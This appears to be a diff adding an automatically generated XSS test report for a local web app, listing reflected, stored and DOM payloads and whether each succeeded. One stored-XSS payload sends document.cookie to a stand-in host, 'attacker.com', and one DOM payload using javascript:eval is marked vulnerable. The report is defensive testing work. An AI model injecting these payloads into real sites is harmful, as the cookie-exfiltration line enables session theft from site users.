@@ -1,0 +1,36 @@
+XSS Vulnerability Test Report
+Generated: 2025-04-20 17:38:44.850422
+Target URL: http://localhost:5001
+
+Reflected XSS Results:
+Payload: <script>alert('XSS')</script>
+Vulnerable: False
+
+Payload: <img src=x onerror=alert('XSS')>
+Vulnerable: False
+
+Payload: javascript:alert('XSS')
+Vulnerable: False
+
+
+Stored XSS Results:
+Payload: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+Vulnerable: False
+
+Payload: <img src=x onerror=fetch('/api/data')>
+Vulnerable: False
+
+Payload: <svg onload=alert('XSS')>
+Vulnerable: False
+
+
+DOM XSS Results:
+Payload: javascript:eval('alert(1)')
+Vulnerable: True
+
+Payload: #<img src=x onerror=alert(1)>
+Vulnerable: False
+
+Payload: javascript:window['alert'](1)
+Vulnerable: False
+
